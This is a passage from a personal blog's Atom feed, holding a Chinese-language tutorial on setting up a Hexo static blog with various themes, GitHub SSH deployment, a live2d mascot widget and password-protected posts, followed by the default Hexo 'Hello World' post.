class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#取消导航栏注释（注意空格对齐）</span></span><br><span class="line">menu:</span><br><span class="line">  categories: /categories/ || fas fa-layer-group</span><br><span class="line">  tags: /tags/ || fas fa-tags</span><br><span class="line">  </span><br><span class="line"><span class="comment">#更改图标(最好使用链接地址，我这里使用的图床，图床使用见下一篇博客)</span></span><br><span class="line">favicon:</span><br><span class="line">  small: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png</span><br><span class="line">  medium: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改背景大图</span></span><br><span class="line">header:</span><br><span class="line">  bg_image:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">    url: https://gitee.com/BothSavage/PicGo/raw/master/image/背景.png</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改头像大图，并设为圆形</span></span><br><span class="line">author:</span><br><span class="line">  avatar:</span><br><span class="line">    url: https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png</span><br><span class="line">    rounded: <span class="literal">true</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#打开访问统计</span></span><br><span class="line">busuanzi:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#打开搜索功能</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="主题2：black-blue"><a href="#主题2：black-blue" class="headerlink" title="主题2：black-blue"></a>主题2：black-blue</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/maochunguang/black-blue.git themes/stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">npm install --save hexo-renderer-jade hexo-renderer-stylus</span><br><span class="line">npm install --save hexo-generator-feed hexo-generator-sitemap hexo-generator-archive hexo-browsersync</span><br></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: black-blue</span><br></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g <span class="comment"># 生成</span></span><br><span class="line">$ hexo s <span class="comment"># 启动本地web服务器</span></span><br></pre></td></tr></table></figure><h3 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/black-blue</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure><h2 id="主题3：spfk"><a href="#主题3：spfk" class="headerlink" title="主题3：spfk"></a>主题3：spfk</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/luuman/hexo-theme-spfk.git themes/stun</span><br></pre></td></tr></table></figure><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: black-blue</span><br></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g <span class="comment"># 生成</span></span><br><span class="line">$ hexo s <span class="comment"># 启动本地web服务器</span></span><br></pre></td></tr></table></figure><h3 id="主题优化-1"><a href="#主题优化-1" class="headerlink" title="主题优化"></a>主题优化</h3><p><strong>1.博客个人信息</strong><br>修改Hexo文件夹根目录下的 <code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#站点标题</span></span><br><span class="line"><span class="number">6</span>| title: Atkx<span class="string">&#x27; blog</span></span><br><span class="line"><span class="string">#作者</span></span><br><span class="line"><span class="string">10| author: Atkx</span></span><br></pre></td></tr></table></figure><p><strong>2.头像设置</strong><br>这里修改主题文件夹下的<code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Link to your avatar |填写头像地址</span></span><br><span class="line"><span class="number">16</span>| avatar: img/atkx_32x32.png</span><br><span class="line"><span class="comment"># Small icon of Your site | 站点小图标地址</span></span><br><span class="line"><span class="number">19</span>| favicon: img/atkx_16x16.png</span><br></pre></td></tr></table></figure><h1 id="Hexo部署到github"><a href="#Hexo部署到github" class="headerlink" title="Hexo部署到github"></a>Hexo部署到github</h1><h2 id="配置github-ssh"><a href="#配置github-ssh" class="headerlink" title="配置github ssh"></a>配置github ssh</h2><blockquote><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步。</p></blockquote><p>在你第一次新建的文件夹里面，点击 Git Bash Here 输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;你的邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成一对密钥 SSH key，持续enter。</p><p>在路径<code>C:\Users\admin\.ssh</code>下找到<code>id_rsa.pub</code>，用记事本打开，复制里面的内容。</p><p>配置路径：github 网站–&gt;Settings–&gt;SSH and GPG keys–&gt;NEW SSH KEY ,title随便填写，把上面复制的内容粘贴进Key里面，点击Add SSH key。</p><p><img src="https://img-blog.csdnimg.cn/20210131144015618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入命令检验是否成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi swhat! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><h2 id="部署文件"><a href="#部署文件" class="headerlink" title="部署文件"></a>部署文件</h2><p>用sublime打开blog下创建的用户名文件进行部署（将文件直接拖进去就可以了）打开仓库<code>_config.yml</code> 配置文件，</p><p>第16行,更改url</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://swhat.github.io</span><br></pre></td></tr></table></figure><p>拉到文件末尾，填上如下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/swhat/swhat.github.io.git </span><br><span class="line">  <span class="comment">#仓库名字改成自己的</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><em>若端口冲突，也可以在<code>_config.yml</code>中添加</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 <span class="comment">#端口号随意，默认是4000</span></span><br><span class="line">  compress: <span class="literal">true</span></span><br><span class="line">  header: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>进入你的swhat目录，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g -d</span><br></pre></td></tr></table></figure><p>会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><p>重新执行<code>hexo g -d</code>，在弹出的框子中，输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131153540546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>命令行也输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131210759817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="网站效果"><a href="#网站效果" class="headerlink" title="网站效果"></a>网站效果</h2><p>访问：<a href="https://swhat.github.io/">https://swhat.github.io</a><br><img src="https://img-blog.csdnimg.cn/20210131210907129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2><p>方法一：新建一个空文章，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo n <span class="string">&quot;文章标题&quot;</span></span><br></pre></td></tr></table></figure><p>如：执行<code>hexo new &quot;My New Post&quot;</code>，会在项目 <code>\Hexo\source\_posts</code> 中生成 My New Post.md 文件，可以进行编辑。</p><p>方法二：也可以在项目 <code>\Hexo\source\_posts</code>下，新建md 文件，然后添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 文章标题</span><br><span class="line">date: 时间，如2020-02-02 02:02:02</span><br><span class="line">categories: 类别</span><br><span class="line">tags:  标签</span><br></pre></td></tr></table></figure><p>在md文章中添加下面的句子，该句子以上可以显示你想显示的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure><p>当我们用编辑器写好文章后，可以使用以下命令将其推送到服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g -d</span><br></pre></td></tr></table></figure><h1 id="博客优化"><a href="#博客优化" class="headerlink" title="博客优化"></a>博客优化</h1><h2 id="添加看板娘"><a href="#添加看板娘" class="headerlink" title="添加看板娘"></a>添加看板娘</h2><p>1、安装模块<br>    在hexo根目录执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>可以在<code>package.json</code>查看是否安装成功<br><img src="https://img-blog.csdnimg.cn/20210203145531821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时再去 node_moduels目录下，可以看到有如下文件夹，这些都是动画主配置<br><img src="https://img-blog.csdnimg.cn/2021020314565224.png" alt="在这里插入图片描述"></p><p>2、下载模型<br>地址：<a href="https://github.com/xiazeyu/live2d-widget-models.git">https://github.com/xiazeyu/live2d-widget-models.git</a></p><p>下载好之后将<code>packages</code>里的所有动画模板拷贝到博客的<code>node_modules</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure><p>也可以挑选自己喜欢的模型，使用命令安装模型，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-haruto</span><br></pre></td></tr></table></figure><p>4.详细配置<br>在Hexo的 _config.yml 文件或主题的 _config.yml 文件中添加配置.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-haruto  </span><br><span class="line">    <span class="comment">#模板目录，在node_modules里，这里是模型名称</span></span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150 </span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="literal">false</span>  <span class="comment">#是否在手机进行显示</span></span><br></pre></td></tr></table></figure><h2 id="博客加密"><a href="#博客加密" class="headerlink" title="博客加密"></a>博客加密</h2><p>1.安装encrypt插件<br>在博客目录下执行下面的指令安装encrypt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>安装完成后，在package.json文件的dependecies依赖中看到encrypt插件<br><img src="https://img-blog.csdnimg.cn/20210205121402142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 . 加密文章设置<br>将”password”字段添加到文章信息头部：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: 文章标题</span><br><span class="line">date: 时间，如2020-02-02 02:02:02</span><br><span class="line">categories: 类别</span><br><span class="line">tags:  标签</span><br><span class="line">password: 123456</span><br><span class="line">abstract: 这里有东西被加密了，需要输入密码查看哦。</span><br><span class="line">message: 您好，这里需要密码。</span><br><span class="line">wrong_pass_message: 抱歉，这个密码看着不太对，请再试试。</span><br><span class="line">wrong_hash_message: 抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。</span><br></pre></td></tr></table></figure><p>效果图<br><img src="https://img-blog.csdnimg.cn/202102051217264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>注意：本文所有命令均在git命令行使用</strong></p><p>参考文章：<br><a href="https://www.imooc.com/article/313424">Hexo结合Stun静态博客搭建从入门到入土</a><br><a href="https://www.jianshu.com/p/3a6342e16e57">hexo 添加live2d看板动画</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：使用Hexo+github搭建博客&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    
    <category term="搭建博客" scheme="https://swhat.github.io/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://swhat.github.io/2020/02/02/hello-world/"/>
    <id>https://swhat.github.io/2020/02/02/hello-world/</id>
    <published>2020-02-01T18:02:02.000Z</published>
    <updated>2021-02-05T04:19:06.601Z</updated>
    
    <content type="html"><![CDATA[<p>Hello World</p><a id="more"></a><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Hello World&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
